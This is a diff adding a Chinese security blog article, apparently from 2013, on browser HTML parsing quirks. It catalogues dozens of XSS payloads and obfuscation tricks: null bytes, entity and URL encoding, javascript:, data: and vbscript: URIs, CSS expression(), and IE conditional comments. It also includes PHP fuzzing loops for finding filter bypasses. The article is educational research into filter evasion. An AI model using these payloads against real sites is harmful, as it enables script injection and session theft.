@@ -1,0 +1,276 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Browser Security-超文本标记语言（HTML）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/06/19 18:55" ui-time="" datetime="2013/06/19 18:55" class="published ng-binding ng-isolate-scope">2013/06/19 18:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h4>重要的4个规则：</h4><pre><code>1 &amp;符号不应该出现在HTML的大部分节点中。
+2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。
+3 在text节点里面，&lt;左尖括号有很大的危害。
+4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。
+</code></pre><h4>文件解析模式</h4><p>在任何HTML文档中，最开始的<code>&lt;!DOCTYPE&gt;</code>用来指示浏览器需要解析的方式，同样也可使用<code>Content-Type</code>头来告诉浏览器。</p><p>一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。</p><p>在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如&lt;img/>也是允许的。</p><h4>了解HTML解析</h4><p><a href="http://static.wooyun.org/20141017/2014101716205670084.jpeg"><img alt="" title="html" width="300" height="55" class="alignnone size-medium wp-image-148" img-src="2014091812393789842.jpeg"></a></p><p>在IE浏览器中允许在1中插入NUL字符(0x00)，可以绕过非常多的xss过滤器。</p><p>如下php代码可把NUL字符插入标签内做测试：</p><p>2和4中的空格也可以由tab(0x0B)与换页键(0x0C)，2处也可以用/来代替。</p><p>5中的"在IE中也可替换成`。</p><p>IE当中还有一个特性是当遇到=后面紧跟一个引号的时候会有奇怪的解析。</p><pre><code>&lt;img src=test.jpg?value="&gt;Yes, we are still inside a tag!"&gt;
+&lt;comment&gt;&lt;img src="&lt;comment&gt;&lt;img src=x onerror=alert(1)//"&gt;
+</code></pre><h4>Entity编码</h4><p>HTML解析器在建立文档树的时候会针对节点内的Entity编码解码后传输。</p><p>以下两个表示相同：</p><pre><code>&lt;img src="http://www.example.com"&gt; 
+&lt;img src="ht&amp;#x74;p&amp;#x3a;//www.example.com"&gt;
+</code></pre><p>下面两个例子代码不会执行，因为，编码的是标签本身的结构而非节点内的内容：</p><pre><code>&lt;img src&amp;#x3d;"http://www.example.com"&gt; 
+&lt;img s&amp;#x72;c="http://www.example.com"&gt;
+</code></pre><h4>Fuzzing</h4><p>对一个普通的HTML进行Fuzzing测试：</p><pre><code>&lt;a href="http://www.google.com/"&gt;Click me&lt;/a&gt;
+</code></pre><p>看一下可以Fuzzing的位置</p><table><thead><tr><th>位置</th><th>代码</th><th>可能插入或替代的代码</th></tr></thead><tbody><tr><td>&lt;的右边</td><td><code>&lt;[here]a href="...</code></td><td>控制符，空白符，非打印字符</td></tr><tr><td>a标签的后门</td><td><code>&lt;a[here]href="...</code></td><td>同上</td></tr><tr><td>href属性中间</td><td><code>&lt;a hr[here]ef="...</code></td><td>同上+空字节</td></tr><tr><td>=两边</td><td><code>&lt;a href[here]=[here]"...</code></td><td>所有字符</td></tr><tr><td>替换=</td><td><code>&lt;a href[here]"...</code></td><td>Union编码符号</td></tr><tr><td>替换"</td><td><code>&lt;a href=[here]…[here]&gt;</code></td><td>其他引号</td></tr><tr><td>>之前</td><td><code>&lt;a href="…"[here]&gt;</code></td><td>任意字符</td></tr><tr><td>/之前</td><td><code>&lt;a href="…"&gt;...&lt;[here]/a&gt;</code></td><td>空白符，控制符</td></tr><tr><td>/之后</td><td><code>&lt;a href="…"&gt;...&lt;/[here]a&gt;</code></td><td>空白符，控制符</td></tr><tr><td>>闭合之前</td><td><code>&lt;a href="…"&gt;…&lt;/a[here]&gt;</code></td><td>所有字符</td></tr></tbody></table><p>可以使用php代码进行快速测试，例如我们对第一个位置（&lt;的右边）进行Fuzzing：</p><pre><code>&lt;?php
+for($i = 0; $i &lt;= 255; $i++) {
+$character = chr($i);
+#  &lt;右边进行测试
+echo '&lt;div&gt;&lt;'.$character.'a href="http://www.google.com/"&gt;'.$i.'&lt;/a&gt;&lt;/div&gt;'; } 
+?&gt;
+</code></pre><p>上面的代码只测试了256个字符，如果想要测试Unicode的所有字符，则需要创建65536个链接。</p><p>php默认字符是ISO-8859-1作为默认的字符编码，而这种编码只有256个字符，所以单纯的循环65536遍是没用的。</p><p>所以采用Entity编码方式循环，解码后输出：</p><pre><code>&lt;?php
+for($i = 0; $i &lt;= 65535; $i++) {
+$character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8')
+# &lt;右边进行测试
+echo '&lt;div&gt;&lt;'.$character.'a href="http://www.google.com/"&gt;'.$i.'&lt;/a&gt;&lt;/div&gt;';
+}?&gt;
+</code></pre><p>有一个有趣的现象是几乎所有浏览器对<code>$#33;</code>即<code>!</code>，浏览器会<code>&lt;!</code>当成注释的开始，然后自动补齐剩下的代码，浏览器解析后的代码：</p><pre><code>&lt;div&gt;&lt;!--a href="http://www.google.com/"--&gt;33&lt;/div&gt;
+</code></pre><h5>针对标签名的Fuzzing：</h5><pre><code>&lt;LԱ onclick=alert(1)&gt;click me&lt;/LԱ&gt;
+</code></pre><p>上面的代码，在Chrom、Firefox和Safari中点击，可以顺利弹出1。</p><p>讨论一下空字符的问题，IE浏览器会自动忽略空字符，并解析剩下的代码，这样会绕过很多采用正则匹配黑名单字符串的过滤器。</p><p>并且，很多函数和库并没有意识到这个问题：</p><pre><code>&lt;?php 
+echo '&lt;im'.chr(0).'g sr'.chr(0).'c=x onerror=ale'.chr(0).'rt(1)&gt;';
+?&gt;
+</code></pre><p>用IE8打开上述代码的网页，查看源代码只能看到"&lt;im"后面的字符都隐藏了。</p><p>还有两种方式可以对标签名Fuzzing，第一种是涉及字符集的问题，第二种是针对php中在过滤之前使用了utf8_decode()函数。</p><pre><code>&lt;?php
+header('Content-Type: text/html;charset=Shift_JIS'); 
+for($i = 1; $i &lt;= 255; $i++) {    
+    $character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');    
+    $character = utf8_decode($character);    
+    echo $character.'123456 '.$i."&lt;br&gt;\r\n";
+} ?&gt;
+</code></pre><p>代码很简单，设置返回响应字符集为Shift&#95;JIS，然后把utf-8转换为Shift&#95;JIS字符集。</p><p>可以看到在IE中129-159和224-252中，123456中的1消失了，与前面的字符合并成一个字符了。</p><p>标签后面也可加入/符号做间隔：</p><pre><code>&lt;img/src=x onerror=alert(1)&gt;
+</code></pre><p>尝试在标签与/之间再插入其他字符来测试，由于空字符无法直观显示，所以用\0来表示null，同样主流浏览器都可以执行：</p><pre><code>&lt;img\0/src=x onerror=alert(1)&gt;
+</code></pre><p>再尝试ASCII码之外的字符，这种字符在正则表达式中\w是无法匹配到的，主流浏览器都可以执行：</p><pre><code>&lt;img/ \/\µ src=x onerror=alert(1)//&gt;
+</code></pre><p>测试发现，标签名与属性名直接只要是以/开头以/或"结尾，中间几乎可以插入任意字符。</p><p>在Fuzzing属性方面，考虑两方面，一个是可以使用什么分隔符，一个是属性值可以采用什么编码。</p><p>分隔符有很多种，单引号，双引号，无任何引号，反撇号（IE中）。</p><pre><code>&lt;?php
+for($i = 1; $i &lt;= 255; $i++) {
+    $character = chr($i);
+    echo '&lt;div&gt;&lt;font size='. $character. '20'. $character. '&gt;'.$i.' &lt;/font&gt;&lt;/div&gt;';
+} ?&gt;
+</code></pre><p>上面代码可以直观的看出当前浏览器支持的分隔符有哪些字符。</p><p>上面代码size属性如果输入的是字符的话，会顺利执行，所以当$character中循环到数字的时候也会顺利解析，但这并非是把数字当成了分割符：</p><pre><code>&lt;?php
+for($i = 20; $i &lt;= 255; $i++) {
+    $character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');
+    echo '&lt;div&gt;&lt;img title="'.$i.'" src='.$character. 'http://www.google.com/intl/en_ALL/images/logo.gif'. $character. '&gt;&lt;/div&gt;'; 
+} ?&gt;
+</code></pre><p>以上代码可以看出，属性为字符串的时候，可以作为分隔符的字符。</p><p>为了表示那些不可打印的字符，就用<code>\x十六进制</code>来表示：</p><pre><code>&lt;img src=\x17\x17 onerror=alert(1)//&gt;
+</code></pre><p>以上代码\x17即表示不可打印字符chr(23)，浏览器提交的时候可以输入%3Cimg%20src%3D%17%17%20onerror%3Dalert%281%29%2f%2f%3E。</p><p>在src中可以正常工作的分隔字符，在处理事件的属性里不一定会工作，例如onerror。</p><p>但是仍然有一些字符可以达到我们的目的，ASCII表中的133和160已经IE中的空字符，甚至是分号。</p><pre><code>&lt;img/\%20src=%17y%17 onerror=%C2%A0alert(1)//&gt;
+</code></pre><p>以上代码urldecode之后在chrome中可以顺利执行。</p><p>下面讨论多个标签的问题，比如用户可控的数据插入到了<code>&lt;input&gt;</code>标签中，同时过滤了<code>&lt;&gt;</code>只能插入标签内数据：</p><pre><code>&lt;input value="" type=image src=1 onerror=alert(1)//" type="hidden" name="foo" /&gt;
+</code></pre><p>绿色部分是我们插入的数据，又插入了一个type属性，但是浏览器执行了alert()，浏览器实际上会执行第一个属性，后面的会忽略掉。</p><p>在IE中还有一个lowsrc的属性，跟src类似，原本是为了方便调用一个缩略图的，但是在IE6和IE7中，同时也支持伪协议javascript:，还有一个dynsrc属性也类似：</p><pre><code>&lt;img lowsrc=1 onerror=alert(1)&gt; // 所有IE都支持
+&lt;img lowsrc=javascript:alert(2)&gt; //IE6和IE7支持
+&lt;img src="http://www.google.de/intl/de_de/images/logo.gif" dynsrc="javascript:alert(3)" /&gt; // 只有IE6支持
+</code></pre><p>sytle属性中还可以定义非常多的参数：</p><pre><code>&lt;span style="color:red" style="color:green;background:yellow"&gt; foobar&lt;/span&gt;
+</code></pre><p>上面代码可以看到，浏览器显示的字体为红色，背景为黄色，除了定义颜色之外也可以用expression()执行js，后面会讨论。</p><p>还有一个属性是专门用来在一个标签中插入多个的：xmlns，XML的命名空间属性，这个后面会在XML中讨论。</p><p>还有一处可Fuzzing的点即为标签的关闭，一个有趣的现象是浏览器把<code>&lt;br/&gt;</code>与<code>&lt;/br&gt;</code>，<code>&lt;p/&gt;</code>与<code>&lt;/p&gt;</code>成完全一样。</p><pre><code>&lt;b &gt; foobar&lt;/b style="x:expression(alert(1))"&gt; // 不会执行alert
+&lt;b &gt; foo&lt;/b &gt; bar&lt;/b style="x:expression(alert(2))"&gt; // IE执行了alert
+&lt;script src="http://0x.lv"&gt;&lt;/b&gt; // 不会执行
+</code></pre><p>可以执行的代码为没有开始标签的一个闭合标签，IE8中，sytle属性可以插在一个闭合标签内，并顺利执行。</p><p>可混淆的另一个方法是:可替换为=，下面例子在IE8中可执行：</p><pre><code>&lt;//style=x:expression(if(!window.x){window.x=1;alert(1);})&gt; 
+&lt;//style='x=expr\65 ssion(if(!window.x){window.x=1;alert(1);})'&gt; 
+&lt;/a/style='x= \a expr\65 ss/*\&amp;#x2a/ion(if(!window.x){window.x=1;alert(1);})'&gt;
+</code></pre><p>HTML代码中执行js的各种方式，用以下方式定义的时候，VBscript和JavaScript都可以执行。</p><pre><code>&lt;script language=vbs&gt;
+alert+1'VBScript
+alert(2)// JavaScript 
+&lt;/script&gt;
+</code></pre><p>也有利用标签中的属性来执行js，例如：onclick，onload，onerror等等。</p><p>在iframe标签中，不需要src属性就可以顺利执行onload属性，而img标签不可以。</p><p>这是因为在iframe中没有src属性的时候，浏览器会自动加载about:blank页面，即空白页。</p><p>附件tag.php可以方便的看到当前浏览器针对各标签在不需要用户交互的情况下，可以自动执行的所有属性。</p><p><a href="http://static.wooyun.org/20141017/2014101716205735611.zip">tag-event.php</a></p><p>从输出结果可以看到body标签支持非常多的属性可以在与用户没有交互的情况下执行js。</p><p>例如load，error事件，所有的mouse和keyboard事件，以及在用户离开时的blur事件，还有unload和beforeunload，以及大家很少知道的pageshow属性。</p><p>同样标签中也有很少遇到的marquee标签：</p><pre><code>&lt;marquee onscroll=alert(1)&gt;
+</code></pre><p>在Chrome中，html标签也可以执行非常多的属性，，同源frameset标签也接受focus和blur事件。</p><p>一个很有趣的例子是，让scroll事件可以无交互触发，我们可以引入一个锚点，例如：</p><p><code>&lt;a name="bottom"&gt;</code>或者通过id属性<code>&lt;div id="bottom"&gt;</code></p><p>那我们可以访问http://test.com/test.html#bottom来访问，浏览器自动滚到该锚点，触发scroll属性。</p><pre><code>&lt;body onscroll="alert(1)"&gt;
+&lt;div style="height:10000px"&gt;some text&lt;/div&gt;
+&lt;a name="bottom"&gt;&lt;/a&gt;
+&lt;/body&gt;
+</code></pre><p>1.html为以上代码，访问1.html#bottom会自动触发onscroll事件。</p><p>IE中hr标签中的onresize属性，在当前窗口大小变化时，会触发resize事件，执行alert(1)。</p><pre><code>&lt;hr onresize=alert(1)&gt;
+</code></pre><p>还有非常多的组合可以在IE中使用，很难全部列出来，只列举出几个很少见的例子：</p><pre><code>&lt;bgsound onpropertychange=alert(1)&gt;
+&lt;body onpropertychange=alert(2)&gt;
+&lt;body onmove=alert(3)&gt;
+&lt;body onfocusin=alert(4)&gt;
+&lt;body onbeforeactivate=alert(5)&gt;
+&lt;body onactivate=alert(6)&gt;
+&lt;embed onmove=alert(7)&gt;
+&lt;object onerror=alert(8)&gt;
+&lt;style onreadystatechange=alert(9) &gt;
+&lt;xml onreadystatechange=alert(10) &gt;
+&lt;xml onpropertychange=alert(11) &gt;
+&lt;table&gt;&lt;td background=javascript:alert(12) &gt; 
+</code></pre><p>除了以上on的各种属性之外，src和href属性由于支持javascript和vbscript（只支持IE）伪协议，所以也是可以执行javascript代码：</p><pre><code>&lt;a href="javascript:alert(1)"&gt;click me&lt;/a&gt;
+&lt;a href="vbscript:alert(2)"&gt;click me&lt;/a&gt;
+</code></pre><p>代码执行时必须使用()，不可以使用vbscript中的alert+2，当点击之后，会弹出一个写在当前页面DOM中的数字2的警告框。</p><p>javascript:和vbscript:协议执行后的结果将会映射在DOM后面。</p><pre><code>&lt;a href="javascript:'\x3cimg src\x3dx onerror=alert(document.domain)&gt;'"&gt;click me&lt;/a&gt;
+</code></pre><p>以上代码在IE和Firefox中点击click me之后可执行，并且可以看到弹出的domain为a标签中所在的domain。</p><p>以上代码需要用户交互，下面看个不需要用户交互的例子，使用object标签和data:标签：</p><pre><code>&lt;object data="javascript:alert(1)"&gt;
+&lt;object data="data:text/html,&lt;script&gt;alert(2)&lt;/script &gt; "&gt;
+&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg"&gt;
+</code></pre><p>以上三个在Firefox中可执行，第二个可在Opera中执行，把各标签中各属性支持javascript的总结了一些：</p><pre><code>&lt;iframe src="javascript:alert(1)"&gt; // 火狐，Chrome, IE8
+&lt;embed src="javascript:alert(2)"&gt; // 火狐 
+&lt;img src="javascript:alert(4)"&gt; // IE6
+&lt;image src="javascript:alert(5)"&gt; // IE6
+&lt;body background="javascript:alert(5)"&gt; // IE6 
+&lt;script src="javascript:alert(6)"&gt; // IE6 
+&lt;table background="javascript:alert(7)"&gt; // IE6 
+&lt;isindex type="image" src="javascript:alert(8)"&gt; // IE6-7
+</code></pre><p>以及applet标签中code和archive属性可以用来调用jar文件，执行java代码。</p><pre><code>&lt;applet code="XSS" archive="http://someserver.com/xss.jar"&gt;&lt;/applet&gt;
+</code></pre><p>Javascript可以通过DOM直接获取当前页面中对应的id和name属性的对象：</p><pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;alert(test)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>上面代码可以看出Javascript中并没定义test变量，但是获取到了页面中id为test的对象。</p><p>反过来，我们可以在外部直接控制Javascript变量，并且在一些浏览器中可以重写Javascript中已有的变量。</p><pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form id="location" href="bar"&gt;
+&lt;script&gt;alert(location.href)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>以上代码在IE中可以看到弹出的bar，而不是当前页面的url，成功覆盖了原本的变量。</p><p>还有一种利用meta标签来执行Javascript：</p><pre><code>&lt;meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)"&gt;
+</code></pre><p>上面代码可以在Chrome，Opera，IE6中可执行javascript代码，并且弹出的时meta标签所在的域。</p><p>如果禁止了javascript:协议，也可使用data:协议，不过能够顺利执行javascript并且继承meta标签域的测试到的只有Opera。</p><pre><code>&lt;meta http-equiv="refresh" content="0; url=data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;
+</code></pre><p>IE中为了兼容各个版本，所以有一个条件注释的语法，这个语法其他浏览器并不支持，会自动当成html注释。</p><pre><code>&lt;!--[if IE 8]&gt;
+&lt;p&gt;Welcome to Internet Explorer 8.&lt;/p&gt; 
+&lt;![endif]--&gt;
+</code></pre><p>如上文字只有在IE8中才会显示，条件注释对于开发是一件很好的事情，可以方便的判断浏览器版本获取兼容代码展现给用户。</p><pre><code>&lt;!--[if gte IE 7]&gt;&lt;p&gt;You are using IE 7 or greater.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if (IE 5)]&gt;&lt;p&gt;You are using IE 5 (any version).&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if (gte IE 5.5)&amp;(lt IE 7)]&gt;&lt;p&gt;You are using IE 5.5 or IE 6.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if lt IE 5.5]&gt;&lt;p&gt;Please upgrade your version of Internet Explorer.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if lt Contoso 2]&gt;
+&lt;p&gt;Your version of the Contoso control is out of date; please update to the latest.&lt;/p&gt;
+&lt;![endif]--&gt;
+&lt;![if IE 8.0] &gt;
+&lt;script &gt; alert(1)&lt;/script &gt;  //只在IE8下执行
+&lt;![endif] &gt;
+&lt;![if IE 8.0000000000000000]]] &gt;
+&lt;script &gt; alert(2)&lt;/script &gt;  // IE8同样执行
+&lt;![endif] &gt;
+&lt;![if IE 8.0000000000000000?] &gt;
+&lt;script &gt; alert(3)&lt;/script &gt;  // 所有的IE都执行
+&lt;![endif] &gt; 
+</code></pre><p>同时IE还支持另外一种方法来执行条件语句，就是通过<comment>标签，并且标签之间的代码并不会执行，但是其他浏览器却会执行。</comment></p><pre><code>&lt;comment&gt;&lt;img src=x onerror=alert(3)&gt;&lt;comment&gt;
+&lt;comment onclick=alert(1)&gt;XXX--&gt; //Opera不执行
+</code></pre><p>IE的JS引擎里同样也有条件注释的语法：</p><pre><code>&lt;script&gt;
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3e11117e5d5d">[email&#160;protected]</a>_on!alert(1)
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b19e9bf1d2d2">[email&#160;protected]</a>_on~alert(2)@*/
+&lt;/script&gt;
+</code></pre><p>前面提到过标签属性中的URI可以做entity编码，同时，javascript:后面也可以做url编码，下面代码在所有浏览器中都可以成功执行。</p><pre><code>&lt;a href="j&amp;#x61vascript:%61lert(1)"&gt;click me&lt;/a&gt;
+</code></pre><p>同时后面的url编码可以再做一次entity编码：</p><pre><code>&lt;a href="j&amp;#x61vascript:&amp;#x25;61lert(1)"&gt;click me&lt;/a&gt;
+</code></pre><p>由于entity编码允许&amp;#之后插入任意多个0，再利用上javascript的注释混淆后：</p><pre><code>&lt;a href="j&amp;#x61vascript: //%0&amp;#x61 &amp;#x00025;61lert(1)"&gt;click me&lt;/a&gt;
+</code></pre><p>base标签定义当前页面链接默认地址或默认目标，下面代码在opera中可执行：</p><pre><code>&lt;base href="javascript:alert(1)"/&gt;
+&lt;a href="#"&gt;click me&lt;/a&gt;
+</code></pre><p>javascript也可以换行分割（在IE与chrome中可执行alert）：</p><pre><code>&lt;a href="j&amp;#x61v
+ascript: //%0&amp;#x61 &amp;#x00025;61lert(1)"&gt;click me&lt;/a&gt;
+</code></pre><p>换行字符同时也可以使用entity编码：</p><pre><code>&lt;a href="j&amp;#x61va&amp;#x000Ascript://%0&amp;#x61&amp;#x00025;61lert(1)"&gt; click me&lt;/a&gt;
+
+&lt;?php
+for($i = 0; $i&lt;=65535; $i++) {
+    $chr = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8'0);
+    echo '&lt;iframe src="java'.$chr.'script:alert('.$i.')"&gt;&lt;/iframe&gt; &lt;br/&gt;';
+} ?&gt;
+</code></pre><p>上面代码可测出当前浏览器中，javascript字符串插入哪些字符仍然可以执行alert。</p><pre><code>&lt;a href="data:text/html;charset=utf-8;base64, PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+Og=="&gt; click&lt;/a&gt;
+</code></pre><p>上面代码在Firefox和Opera中可以弹出当前域，Chrome与Safari可以弹，但是继承不到a标签所在的域，弹出为空，IE不能执行。</p><p>Firefox中data:协议默认MIME类型为text/html，即使你定义了一个他根本不知道的类型，他也会把它当作text/html类型：</p><pre><code>&lt;iframe src="data:µ,&lt;script&gt;alert(1)&lt;/script&gt;"&gt; &lt;/iframe&gt;
+&lt;iframe src="data:&amp;#ffff;,&lt;script&gt;alert(2)&lt;/script&gt;"&gt;&lt;/iframe&gt;
+</code></pre><p>利用之前总结的结论，最终可以写出下面可让Firefox执行的代码：</p><pre><code>&lt;iframe/
+\/src="data:µ,%3cscript%3ealert(document.dom&amp;#x25;61in+[])%3c/script%3e"&gt; &lt;/iframe&gt;
+</code></pre><p>并且火狐中会忽略data:协议中的所有空白字符：</p><pre><code>&lt;iframe src="data:.&amp;#x2c &amp;#x25;
+3
+cscri pt%
+3 e alert(1)
+%3c /s &amp;#x43 RIP t&gt;"&gt;
+</code></pre><p>最终可以混淆成这样：</p><pre><code>&lt;iframe src="d&amp;#097t&amp;#x0061:. &amp;#x2c &amp;#x25; 3
+c s cri &amp;#x00D; pt %
+3 e al\u0065rt(1)
+%3c /s &amp;#x43 RI &amp;#x009 P t&gt;"
+data:%,&lt;b&gt; &lt; s &amp;#10 c r i p t&gt;alert(1) &lt; /s &amp;#10 c r i p t&gt;
+</code></pre><p>之前提到的标签，在IE中data:协议都不能执行javascript，但是在style标签里，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="90751f3f742b3579100a782f17d0f9fde0ffe2e475012d742b34761f02751535f4f1e4f1">[email&#160;protected]</a>:执行javascript：</p><pre><code>&lt;style&gt;
+@import "data:,*%7bx:expression(write(1))%7D";
+&lt;/style&gt;
+&lt;style&gt;
+@imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; &lt;/style&gt;
+&lt;style&gt;
+&lt;link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d"&gt;
+</code></pre><p>下面讨论一下事件即onload、onerror等事件之后的混淆方法：</p><pre><code>&lt;body onload="al&amp;#000101rt&amp;#8233
+/*&amp;#00*/(document. dom&amp;#x5cu0061in)//"&gt;
+</code></pre><p>采用了entity编码，最后一处是先使用javascript的unicode编码，然后再entity编码。</p><p>由于是直接处理DOM的方法和对象，与直接在script标签内处理字符串的环境还是不同，但是我们可以加注释或者换行符。</p><pre><code>&lt;body onload="al&amp;#000101rt&amp;#8233
+//&amp;#x0d/*&amp;#00*/(document. dom&amp;#x5cu0061in)//"&gt;
+</code></pre><p>当使用location重定向到javascript:伪协议url的时候，又可以多做一重编码了：</p><pre><code>&lt;body/:a/onload="location='j&amp;#97vAscript:'
++&amp;#x28[&amp;#x5d+
+'\141\l\u0065rt\r\(/*&amp;#x2a/docum%65nt.dom\x&amp;#x0032;561in)'
+)"&gt;
+</code></pre><p>事件同时又可以直接调用其他属性：</p><pre><code>&lt;img src="x" onload="alert(1)" onerror="this.onload()"&gt;
+&lt;img/src="*/(1)"title="alert/*"onerror="eval(title+src)"&gt;
+</code></pre><p>style属性的混淆，一个没有任何混淆的简单例子：</p><pre><code>&lt;input type="text" value="" style=display:block;position:absolute;top:0;left:0;width:999em; height:999em onmouseover=alert(1) a="" name="foo" /&gt;
+</code></pre><p>利用之前总结的在属性里的混淆方法：</p><pre><code>&lt;l1!/style="-:\65 \x/**/\p\r\0&amp;#x30;0065 /**/ssio\n(write /**&amp;#x2f(dom\u0061in))"&gt; 
+</code></pre><p>在expression中，我们可以直接访问document中的write方法和domain属性，这表明我们当前位于document的DOM范围内。</p><pre><code>&lt;l1!/style="-:\65 \x/**/\p\r\0&amp;#x30;0065 /**/ssio\n(location='j&amp;#97vAscript:'+&amp;#x28[&amp;#x5d+'document.write\r\(/*&amp;#x2a/1)'))"&gt; 
+</code></pre><p>转到javascript的URL时，已不在document当中，访问write方法时需要使用document.write。</p><p>看到有\xx和\xxxxxx的Unicode编码，这些都是CSS编码，与JavaScript编码非常相似。</p><p>下面两个URL中列举了一些浏览器对各种奇怪的css语法支持情况：</p><p><a href="http://imfo.ru/csstest/css_hacks/import.php">http://imfo.ru/csstest/css_hacks/import.php</a> <a href="http://centricle.com/ref/css/filters/">http://centricle.com/ref/css/filters/</a></p><p>在IE中，css的解析非常的宽泛：</p><pre><code>&lt;style&gt;
+/*\*/*{x:expression(write(1))/*
+&lt;/style&gt;
+&lt;style&gt;
+_{content:"\"/*" x}
+*{0:expression(write(2))
+&lt;/style&gt;
+&lt;a style=&lt;!---/**/&amp;#61expression(write(3))/*-- &gt; X&lt;/a &gt; 
+</code></pre><p>从IE5.5到IE8中，除了expression可以用来执行JavaScript之外，也可以通过HTML+TIME的形式。</p><p>这种方式唯一的缺点就是也需要一个事件来执行JavaScript，即onbegin或者onend：</p><pre><code>1&lt;l style="behavior:url(#default#time2)"onbegin="alert(1)"&gt;
+</code></pre><p>还有一种方式利用set标签：</p><pre><code>1&lt;set/xmlns="urn:schemas-microsoft-com:time" style="beh&amp;#x41vior:url(#default#time2)" attributename="innerhtml" to="&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=alert(1)&amp;gt;"&gt;
+</code></pre><p>测试一下style属性中在哪些浏览器中，可以插入哪些字符：</p><pre><code>&lt;?php
+for($i = 0; $i&lt;=65535; $i++) {
+    $chr = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');
+    echo '&lt;a style="color='.$chr.'red"&gt;'.dechex($i).'['.$chr.']&lt;/a&gt;';
+} ?&gt;
+</code></pre><p>从测试结果可以得出，下面的代码可以在IE中执行：</p><pre><code>&lt;div style=xss&amp;#x2000;:&amp;#x3000;expression(write(1))&gt;
+</code></pre><p>在一些老版本的IE中，如IE6和IE7，还可以通过背景相关属性调用javascript的URL来执行javascript代码：</p><pre><code>&lt;b style="background:url(javascript:alert('background'))"&gt;xxx&lt;/b&gt; 
+&lt;b style="background-image:url(javascript:alert('background'))"&gt; xxx&lt;/b&gt;
+&lt;b style="list-style:url(javascript:alert('background'))"&gt;xxx&lt;/b&gt; 
+&lt;b style="list-style-image:url(javascript:alert('background'))"&gt; xxx&lt;/b&gt;
+</code></pre><p>通过link标签（在IE6下适用，同时javascript可以换成vbscript）：</p><pre><code>&lt;link rel="stylesheet" href="javascript:alert(1)"&gt;
+&lt;link rel="stylesheet" href="vb&amp;#x09script:%61lert(document.domain)"&gt;
+</code></pre><p>style标签中可以通过导入url的方式执行javascript：</p><pre><code>&lt;style&gt;
+@imp\o\ rt url('javascript:%61lert(2)'); 
+&lt;/style&gt;
+</code></pre><p>HTML5中增加了很多标签跟属性，列举一些可执行JavaScript的方法：</p><pre><code>&lt;form&gt;&lt;input&gt;&lt;output onforminput="alert(1)"&gt; //Opera支持
+</code></pre><p>onfocus与autofocus的配合：</p><pre><code>&lt;input onfocus=write(domain) autofocus&gt;
+&lt;keygen onfocus=write(domain) autofocus&gt;
+&lt;textarea onfocus=write(domain) autofocus&gt;
+&lt;body onfocus=write(domain) autofocus&gt;
+&lt;frameset onfocus=write(domain) autofocus&gt;
+&lt;button onfocus=write(domain) autofocus&gt;
+&lt;input autofocus onblur=write(domain)&gt;&lt;input autofocus&gt; //Chrome中无交互执行
+&lt;iframe/src=javascript:alert(1)&gt;
+&lt;video/poster=javascript:alert(2)&gt;
+&lt;button form="test" formaction="javascript:alert(3)"&gt;
+</code></pre><p>更多的html5攻击方式请见：<a href="http://html5sec.org/">http://html5sec.org/</a></p><p>XML内容比较少，就一起写到HTML里了，XML支持Unicode，所以Unicode里的所有字符都可以用来做标签或者属性，同时有可能绕过&lt;\w+匹配：</p><pre><code>&lt;啊 onclick="alert(1)" xmlns="http://www.w3.org/1999/xhtml"&gt;XXX&lt;/啊&gt;
+</code></pre><p>XML相比HTML最严格的就是有了开始的标签，必须要有结束标签匹配，否则会报错。</p><p>但是在大多数浏览器中似乎并不会影响页面中javascript的解析（IE中不执行）：</p><pre><code>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; 
+&lt;script&gt;
+alert(1); // works
+&lt;/script&gt;
+&lt;p&gt;
+&lt;script&gt;
+alert(2); // works too 
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><p>甚至可以通过JavaScript修改错误页面的内容（在Firefox中可执行）：</p><pre><code>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; 
+&lt;p&gt;
+&lt;script&gt;
+setTimeout(function(){ document.activeElement.textContent='hello world' },1);
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><p>XML的编码规范与HTML非常相似，可以用entity编码属性值。 在XML中，我们可以在DOCTYPE中自定义entity，甚至通过URL引入外部文件：</p><pre><code>&lt;!DOCTYPE xss [&lt;!ENTITY x "&amp;#x61;l&amp;#x26;y;"&gt;&lt;!ENTITY y "ert"&gt;]&gt;
